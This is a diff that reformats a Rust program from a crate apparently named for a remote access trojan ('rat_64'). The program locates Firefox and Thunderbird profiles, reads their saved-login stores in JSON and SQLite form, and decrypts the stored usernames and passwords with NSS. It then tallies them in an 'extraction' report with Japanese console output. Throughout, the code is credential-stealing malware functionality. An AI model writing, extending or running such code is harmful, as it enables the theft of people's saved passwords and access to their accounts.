@@ -1,5 +1,5 @@
 use rat_64::{Config, RatError};
-use serde::{Serialize, Deserialize};
+use serde::{Deserialize, Serialize};
 use std::time::{SystemTime, UNIX_EPOCH};
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -61,7 +61,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             }
             Err(e) => {
                 report.extraction_summary.errors_encountered += 1;
-                report.extraction_errors.push(format!("Firefox password collection error: {}", e));
+                report
+                    .extraction_errors
+                    .push(format!("Firefox password collection error: {}", e));
             }
         }
     }
@@ -87,12 +89,21 @@ fn load_extraction_config() -> Result<Config, RatError> {
 
 fn print_extraction_config(config: &Config) {
     println!("\n⚙️  抽出設定:");
-    println!("   ブラウザパスワード: {}", if config.collect_browser_passwords { "✅" } else { "❌" });
+    println!(
+        "   ブラウザパスワード: {}",
+        if config.collect_browser_passwords {
+            "✅"
+        } else {
+            "❌"
+        }
+    );
 }
 
 #[cfg(feature = "browser")]
 async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, RatError> {
-    use rat_64::collectors::password_manager::{JsonCredentials, SqliteCredentials, CredentialsBackend};
+    use rat_64::collectors::password_manager::{
+        CredentialsBackend, JsonCredentials, SqliteCredentials,
+    };
 
     let mut passwords = Vec::new();
     let profiles = get_firefox_profiles()?;
@@ -110,7 +121,12 @@ async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, Ra
                 if let Ok(json_creds) = JsonCredentials::open(json_path) {
                     if let Ok(logins) = json_creds.iter() {
                         for (hostname, encrypted_username, encrypted_password, enc_type) in logins {
-                            let (username, password) = attempt_decrypt_nss_credentials(&profile_path, &encrypted_username, &encrypted_password).await;
+                            let (username, password) = attempt_decrypt_nss_credentials(
+                                &profile_path,
+                                &encrypted_username,
+                                &encrypted_password,
+                            )
+                            .await;
                             profile_passwords.push(BrowserPassword {
                                 browser: format!("{} (JSON)", browser_name),
                                 url: hostname,
@@ -129,7 +145,12 @@ async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, Ra
                 if let Ok(sqlite_creds) = SqliteCredentials::open(sqlite_path) {
                     if let Ok(logins) = sqlite_creds.iter() {
                         for (hostname, encrypted_username, encrypted_password, enc_type) in logins {
-                            let (username, password) = attempt_decrypt_nss_credentials(&profile_path, &encrypted_username, &encrypted_password).await;
+                            let (username, password) = attempt_decrypt_nss_credentials(
+                                &profile_path,
+                                &encrypted_username,
+                                &encrypted_password,
+                            )
+                            .await;
                             profile_passwords.push(BrowserPassword {
                                 browser: format!("{} (SQLite)", browser_name),
                                 url: hostname,
@@ -158,7 +179,10 @@ fn get_firefox_profiles() -> Result<Vec<std::path::PathBuf>, RatError> {
     let mut profiles = Vec::new();
     if let Some(appdata) = std::env::var_os("APPDATA") {
         let appdata_path = std::path::PathBuf::from(appdata);
-        let firefox_dir = appdata_path.join("Mozilla").join("Firefox").join("Profiles");
+        let firefox_dir = appdata_path
+            .join("Mozilla")
+            .join("Firefox")
+            .join("Profiles");
         profiles.extend(scan_firefox_directory(&firefox_dir));
         let thunderbird_dir = appdata_path.join("Thunderbird").join("Profiles");
         profiles.extend(scan_firefox_directory(&thunderbird_dir));
@@ -199,7 +223,10 @@ fn detect_firefox_browser_type(path: &std::path::Path) -> &'static str {
 }
 
 #[cfg(feature = "browser")]
-async fn collect_with_advanced_nss(profile_path: &std::path::Path, browser_name: &str) -> Result<Vec<BrowserPassword>, RatError> {
+async fn collect_with_advanced_nss(
+    profile_path: &std::path::Path,
+    browser_name: &str,
+) -> Result<Vec<BrowserPassword>, RatError> {
     use rat_64::collectors::password_manager::NssCredentials;
     let mut passwords = Vec::new();
     let nss_creds = NssCredentials::new(profile_path.to_path_buf());
@@ -234,8 +261,12 @@ async fn attempt_decrypt_nss_credentials(
             let username = if encrypted_username.is_empty() {
                 "[EMPTY]".to_string()
             } else {
-                nss.decrypt(encrypted_username)
-                    .unwrap_or_else(|_| format!("[ENCRYPTED] {}", &encrypted_username[..std::cmp::min(20, encrypted_username.len())]))
+                nss.decrypt(encrypted_username).unwrap_or_else(|_| {
+                    format!(
+                        "[ENCRYPTED] {}",
+                        &encrypted_username[..std::cmp::min(20, encrypted_username.len())]
+                    )
+                })
             };
             let password = if encrypted_password.is_empty() {
                 "[EMPTY]".to_string()
@@ -247,17 +278,30 @@ async fn attempt_decrypt_nss_credentials(
             return (username, password);
         }
     }
-    let username = if encrypted_username.is_empty() {"[EMPTY]".to_string()} else { encrypted_username.to_string() };
-    let password = if encrypted_password.is_empty() {"[EMPTY]".to_string()} else { "[ENCRYPTED]".to_string() };
+    let username = if encrypted_username.is_empty() {
+        "[EMPTY]".to_string()
+    } else {
+        encrypted_username.to_string()
+    };
+    let password = if encrypted_password.is_empty() {
+        "[EMPTY]".to_string()
+    } else {
+        "[ENCRYPTED]".to_string()
+    };
     (username, password)
 }
 
 fn print_extraction_results(report: &AuthReport) {
     println!("\n📊 サマリー:");
-    println!("  Firefox/Thunderbird パスワード: {} 件", report.extraction_summary.passwords_found);
+    println!(
+        "  Firefox/Thunderbird パスワード: {} 件",
+        report.extraction_summary.passwords_found
+    );
     if !report.extraction_errors.is_empty() {
         println!("\n⚠️ エラー:");
-        for e in &report.extraction_errors { println!("  {}", e); }
+        for e in &report.extraction_errors {
+            println!("  {}", e);
+        }
     }
 }
 
